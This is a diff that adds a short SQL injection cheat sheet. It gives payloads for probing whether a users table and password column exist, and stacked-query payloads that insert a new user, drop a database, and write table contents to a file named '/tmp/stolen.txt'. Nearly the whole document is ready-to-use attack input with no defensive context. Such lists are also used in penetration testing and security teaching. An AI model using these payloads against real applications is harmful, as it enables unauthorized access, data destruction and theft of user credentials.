@@ -1,0 +1,23 @@
+SINGLE QUERY:
+
+Does "users" table exist?
+' OR 0<(select count(*) from users);#
+' OR (select 1 from users limit 1);#
+
+Does field 'password' exist in users table?
+' OR 0<(select count(password) from users);#
+
+
+MULTIPLE QUERIES:
+
+Add new user:
+';INSERT INTO users SET username='xxx', password='xxx';#
+
+Drop database:
+';DROP DATABASE users;
+
+Make copy of table data in file:
+
+';SELECT * FROM users INTO OUTFILE '/tmp/stolen.txt'; 
+
+Note: must have permissions at output location
